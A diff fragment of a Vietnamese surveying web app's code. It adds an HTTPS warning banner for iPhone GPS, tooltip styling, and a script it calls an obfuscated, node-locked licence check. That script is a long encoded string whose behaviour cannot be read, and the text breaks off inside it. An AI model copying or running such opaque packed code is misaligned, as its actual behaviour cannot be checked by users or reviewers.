+/* Cảnh báo nếu app không chạy qua HTTPS -> iPhone/Safari sẽ chặn GPS (báo nhầm là chưa cấp quyền) */
+if(!window.isSecureContext){
+  const b=document.createElement('div');
+  b.style.cssText='position:fixed;left:8px;right:8px;bottom:calc(env(safe-area-inset-bottom) + 10px);z-index:99999;background:#b3261e;color:#fff;font-size:13px;line-height:1.4;padding:11px 40px 11px 13px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,.4);font-family:system-ui,-apple-system,sans-serif';
+  b.innerHTML='⚠️ <b>GPS sẽ không chạy trên iPhone</b> vì app đang mở không qua HTTPS (file:// hoặc http://). Hãy đưa lên GitHub Pages / Netlify rồi mở bằng địa chỉ <b>https://…</b> trên Safari.'+
+    '<span style="position:absolute;top:6px;right:10px;cursor:pointer;font-size:20px;line-height:1" onclick="this.parentNode.remove()">×</span>';
+  document.body.appendChild(b);
+}
+// tooltip label styling
+const s=document.createElement('style');
+s.textContent='.leaflet-tooltip.lbl{background:rgba(15,21,28,.85);border:1px solid var(--line);color:#fff;font-family:var(--mono);font-size:11px;padding:1px 5px;border-radius:5px}.leaflet-tooltip.lbl::before{display:none}';
+document.head.appendChild(s);
+</script>
+<!-- GeoField VN-2000 PRO v6 · build 2026-07-06 · Tác giả: John · +faster/stable GPS, obfuscated node-locked license -->
+
+<!-- ===== KHOA BAN QUYEN (node-locked, ECDSA P-256) · DUNG THU + THEO NAM · Tac gia John · packed ===== -->
+<script>
+(function(){var _0x920d7c=[127,239,119,151,227,89,52,200,139,213,6];var _0x579a1e='=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